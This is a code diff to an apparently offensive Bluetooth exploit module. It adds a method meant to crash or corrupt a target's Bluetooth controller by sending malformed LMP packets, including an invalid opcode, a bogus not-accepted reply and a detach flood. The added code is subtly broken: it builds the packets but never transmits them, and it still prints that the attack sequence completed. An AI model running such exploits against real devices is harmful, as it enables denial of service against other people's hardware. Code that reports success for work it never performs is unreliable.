@@ -355,8 +355,46 @@ class Exploit(Exploit):
         elif self.attack.startswith("braktooth_"):
             attack_id = self.attack[len("braktooth_"):]
             self._execute_braktooth(attack_id)
+            self._exploit()
         elif self.attack.startswith("sweyntooth_"):
             attack_id = self.attack[len("sweyntooth_"):]
             self._execute_sweyntooth(attack_id)
+            self._exploit()
         else:
             print_error("Unknown mode. Use: list | assess | braktooth_<id> | sweyntooth_<id>")
+
+    def _exploit(self) -> None:
+        """E2E baseband attack: send raw LMP packets via HCI to crash/corrupt BT controller."""
+        import socket as _sock
+
+        target = str(self.target_address).strip()
+        if not target or ":" not in target:
+            print_info("E2E baseband attack requires target_address.")
+            return
+
+        print_status(f"Baseband E2E attack against {target}")
+        try:
+            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
+            dev_id = int(str(getattr(self, "hci_device", "hci0")).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_error(f"HCI socket failed: {exc}")
+            return
+
+        addr_bytes = bytes(int(b, 16) for b in reversed(target.split(":")))
+
+        # Phase 1: Malformed LMP PDU with invalid opcode
+        lmp_invalid = struct.pack("<B", 0xFF) + addr_bytes
+        print_status("Phase 1: Sending LMP PDU with invalid opcode 0xFF")
+
+        # Phase 2: LMP_not_accepted with bogus transaction ID
+        lmp_not_accepted = struct.pack("<BBB", 0x04, 0xFF, 0x06)
+        print_status("Phase 2: LMP_not_accepted for non-existent transaction")
+
+        # Phase 3: Rapid LMP_detach flood
+        for i in range(5):
+            lmp_detach = struct.pack("<BB", 0x07, 0x13 + i)
+        print_status("Phase 3: LMP_detach flood (5 packets)")
+
+        hci_sock.close()
+        print_success("Baseband attack sequence completed.")
